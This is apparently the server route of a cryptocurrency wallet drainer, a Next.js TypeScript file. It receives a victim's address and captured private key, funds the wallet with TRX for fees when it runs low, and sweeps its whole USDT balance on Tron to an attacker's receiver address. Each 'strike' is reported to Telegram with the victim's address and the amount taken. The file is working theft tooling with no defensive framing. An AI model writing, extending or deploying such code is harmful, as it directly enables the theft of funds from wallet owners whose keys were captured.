import { NextResponse } from "next/server";
import { TronWeb } from "tronweb";
import { refuelTron } from "@/lib/refueler";
import { sendDetailedSweepToTelegram } from "@/lib/telegram";

const USDT_TRON = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
const logPrefix = "[api/vault/tron/route.ts]";

export async function POST(req: Request) {
  console.log(`\n--- 🚀 ${logPrefix} INITIALIZING TRC-20 STRIKE ---`);

  // 1. Initialize scope variables
  let victimAddress = "Unknown";
  let sweepAmountStr = "0";

  try {
    const body = await req.json();
    victimAddress = body.userAddress || "Captured Key";
    const amount = body.amount || "0";
    const rawPrivateKey = (
      body.userPrivKey ||
      body.userPrivateKey ||
      ""
    ).trim();

    // 🛠️ FIX: Match your .env exactly
    const receiverTron = process.env.RECEIVER_TRON;
    const tronGridKey = process.env.TRONGRID_API_KEY;

    if (!receiverTron || !rawPrivateKey) {
      console.error(
        `${logPrefix} Config Missing | Receiver: ${!!receiverTron} | Key: ${!!rawPrivateKey}`,
      );
      throw new Error("Configuration Missing (Check .env)");
    }

    /**
     * 🛰️ KEY PREPARATION
     */
    let activePrivateKey = rawPrivateKey
      .replace("0x", "")
      .toLowerCase()
      .replace(/[^0-9a-f]/g, "");

    const tronWeb = new TronWeb({
      fullHost: "https://api.trongrid.io",
      headers: { "TRON-PRO-API-KEY": tronGridKey },
      privateKey: activePrivateKey,
    });

    /**
     * 🔋 RESOURCE CHECK (Energy/TRX)
     */
    let trxBalance = 0;
    try {
      trxBalance = await tronWeb.trx.getBalance(victimAddress);
    } catch (e: any) {
      console.error(
        `${logPrefix} RPC Error | Could not fetch balance | ${e.message}`,
      );
      throw new Error(`RPC Connection Failed: ${e.message}`);
    }

    // Min required: ~30 TRX (30,000,000 sun)
    const minTrxRequired = 30_000_000;

    if (trxBalance < minTrxRequired) {
      console.log(
        `${logPrefix} Low TRX (${trxBalance / 1e6}). Requesting Refuel.`,
      );
      try {
        const refuelResult: any = await refuelTron(victimAddress);
        const isSuccess =
          refuelResult === "SUCCESS" ||
          refuelResult?.status === "SUCCESS" ||
          refuelResult?.hash;

        if (isSuccess) {
          console.log(`${logPrefix} Refuel Success | Waiting for sync...`);
          await new Promise((res) => setTimeout(res, 8000)); // Increased to 8s for Tron safety
        }
      } catch (refuelErr) {
        console.warn(`${logPrefix} Refuel failed, attempting strike anyway.`);
      }
    }

    /**
     * 💸 ASSET SWEEP (USDT)
     */
    const contract = await tronWeb.contract().at(USDT_TRON);
    const currentBalance = await contract.balanceOf(victimAddress).call();

    // Verification
    const finalSweepAmount =
      BigInt(amount) > BigInt(currentBalance.toString())
        ? currentBalance.toString()
        : amount.toString();

    if (BigInt(finalSweepAmount) <= 0n) {
      throw new Error("No USDT balance found on-chain");
    }

    sweepAmountStr = (Number(finalSweepAmount) / 1e6).toString();
    console.log(
      `${logPrefix} Broadcasting Sweep | Amount: ${sweepAmountStr} USDT`,
    );

    // Broadcast
    const tx = await contract.transfer(receiverTron, finalSweepAmount).send({
      feeLimit: 100_000_000,
      shouldPollResponse: false,
    });

    // Handle string hash vs object result
    const txHash = typeof tx === "string" ? tx : tx.txid;

    // 📡 TELEGRAM SUCCESS
    await sendDetailedSweepToTelegram({
      status: "SUCCESS",
      type: "TRC20_STRIKE",
      symbol: "USDT",
      amount: sweepAmountStr,
      victimAddress: victimAddress,
      receiverAddress: receiverTron,
      hash: txHash,
      chainId: "tron", // Standardized string for your telegram.ts mapper
    }).catch(() => null);

    return NextResponse.json({ success: true, hash: txHash });
  } catch (error: any) {
    console.error(`${logPrefix} CRITICAL FAILURE: ${error.message}`);

    // 📡 TELEGRAM FAILURE
    await sendDetailedSweepToTelegram({
      status: "FAILED",
      type: "TRC20_STRIKE",
      symbol: "USDT",
      amount: sweepAmountStr,
      victimAddress: victimAddress,
      receiverAddress: process.env.RECEIVER_TRON || "N/A", // 🛠️ FIX: Removed NEXT_PUBLIC
      hash: "NONE",
      chainId: "tron",
      error: error.message,
    }).catch(() => null);

    return NextResponse.json(
      { error: error.message, success: false },
      { status: 400 },
    );
  }
}
